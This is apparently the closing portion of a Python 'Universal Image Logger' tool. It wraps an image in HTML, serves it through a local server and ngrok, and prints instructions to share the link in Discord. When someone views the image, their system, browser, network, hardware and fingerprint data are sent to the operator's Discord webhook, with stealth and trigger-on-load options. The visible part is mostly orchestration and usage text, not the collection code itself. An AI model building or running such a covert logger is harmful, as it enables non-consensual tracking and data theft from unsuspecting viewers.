            if self.logger_type == "local":
                html_filepath = self.create_local_html(filename)
            else:  # pro
                html_filepath = self.create_local_html(filename)  # Для pro используем local как базовый
            
            print(f"{Fore.CYAN}[*] HTML wrapper: {html_filepath}")
            
            index_path = self.create_index_html()
            print(f"{Fore.CYAN}[*] Index HTML: {index_path}")
            
            print(f"{Fore.CYAN}[*] Starting local HTTP server...")
            if self.start_local_server():
                print(f"{Fore.GREEN}[+] Local server is running on port {self.local_port}")
                
                ngrok_url = self.get_ngrok_url()
                if ngrok_url:
                    public_url = f"{ngrok_url}/{os.path.basename(html_filepath)}"
                    print(f"{Fore.GREEN}[+] Ngrok URL: {public_url}")
                    print(f"{Fore.GREEN}[+] Full URL: {public_url}")
                else:
                    print(f"{Fore.YELLOW}[!] Ngrok not detected. Please start ngrok manually:")
                    print(f"{Fore.YELLOW}[*] ngrok http {self.local_port}")
                    print(f"{Fore.CYAN}[*] Then use the ngrok URL + /{os.path.basename(html_filepath)}")
            else:
                print(f"{Fore.RED}[!] Failed to start local server")
                print(f"{Fore.YELLOW}[*] Try running the tool again or check if port {self.local_port} is in use")
            
            self.show_instructions(filepath, filename, html_filepath)
            
            return True
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error generating universal image logger: {e}")
            return False

    def show_instructions(self, filepath, filename, html_filepath):
        """Показывает инструкции по использованию"""
        print(f"\n{Fore.CYAN}[*] Usage Instructions:")
        print(f"{Fore.CYAN}[*] ===================")
        
        if self.use_ngrok:
            print(f"{Fore.YELLOW}[*] 1. Start ngrok: ngrok http {self.local_port}")
            print(f"{Fore.YELLOW}[*] 2. Wait for ngrok to start and get the public URL")
            print(f"{Fore.YELLOW}[*] 3. Share the ngrok URL + /filename.html in Discord")
            print(f"{Fore.YELLOW}[*] 4. When someone views the image, data will be collected")
        else:
            print(f"{Fore.YELLOW}[*] 1. Open the HTML file in a browser")
            print(f"{Fore.YELLOW}[*] 2. Or share the local URL with others")
            print(f"{Fore.YELLOW}[*] 3. When someone views the image, data will be collected")
        
        print(f"{Fore.YELLOW}[*] 5. Data will be sent to your Discord webhook")
        
        print(f"\n{Fore.CYAN}[*] Logger Type: {self.logger_type.upper()}")
        print(f"{Fore.CYAN}[*] =================")
        
        if self.logger_type == "local":
            print(f"{Fore.WHITE}[*] Local Image Logger: HTML + Image file")
        else:
            print(f"{Fore.WHITE}[*] Image Logger Pro: Real images with JS")
        
        print(f"\n{Fore.CYAN}[*] Troubleshooting:")
        print(f"{Fore.CYAN}[*] =================")
        print(f"{Fore.WHITE}[*] If you get 502 Bad Gateway (ERR_NGROK_8012):")
        print(f"{Fore.WHITE}[*] 1. Make sure the local server is running on port {self.local_port}")
        print(f"{Fore.WHITE}[*] 2. Check that ngrok is pointing to the correct port: ngrok http {self.local_port}")
        print(f"{Fore.WHITE}[*] 3. Try restarting both the server and ngrok")
        print(f"{Fore.WHITE}[*] 4. Check firewall settings")
        print(f"{Fore.WHITE}[*] 5. Try a different port if 4040 is blocked")
        print(f"{Fore.WHITE}[*] 6. Make sure no other service is using port {self.local_port}")
        
        print(f"\n{Fore.CYAN}[*] File Information:")
        print(f"{Fore.CYAN}[*] =================")
        print(f"{Fore.WHITE}[*] Image: {filepath}")
        print(f"{Fore.WHITE}[*] HTML: {html_filepath}")
        try:
            if os.path.exists(filepath):
                print(f"{Fore.WHITE}[*] Size: {os.path.getsize(filepath)} bytes")
            else:
                print(f"{Fore.WHITE}[*] Size: File not found")
        except Exception as e:
            print(f"{Fore.WHITE}[*] Size: Error getting file size - {e}")
        print(f"{Fore.WHITE}[*] Created: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        print(f"\n{Fore.CYAN}[*] Features Enabled:")
        print(f"{Fore.CYAN}[*] =================")
        print(f"{Fore.WHITE}[*] System Info: {'✅' if self.collect_system_info else '❌'}")
        print(f"{Fore.WHITE}[*] Browser Info: {'✅' if self.collect_browser_info else '❌'}")
        print(f"{Fore.WHITE}[*] Network Info: {'✅' if self.collect_network_info else '❌'}")
        print(f"{Fore.WHITE}[*] Hardware Info: {'✅' if self.collect_hardware_info else '❌'}")
        print(f"{Fore.WHITE}[*] Fingerprint Info: {'✅' if self.collect_fingerprint_info else '❌'}")
        print(f"{Fore.WHITE}[*] Stealth Mode: {'✅' if self.stealth_mode else '❌'}")
        print(f"{Fore.WHITE}[*] Trigger on Load: {'✅' if self.trigger_on_load else '❌'}")
        print(f"{Fore.WHITE}[*] Trigger on Click: {'✅' if self.trigger_on_click else '❌'}")
        print(f"{Fore.WHITE}[*] Use Ngrok: {'✅' if self.use_ngrok else '❌'}")

def main():
    """Главная функция"""
    logger = UniversalImageLogger()
    
    try:
        logger.print_banner()
        
        if logger.get_user_input():
            logger.run()
        else:
            print(f"{Fore.YELLOW}[!] Operation cancelled")
            
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Operation interrupted")
    except Exception as e:
        print(f"{Fore.RED}[!] Unexpected error: {e}")

if __name__ == "__main__":
    main() 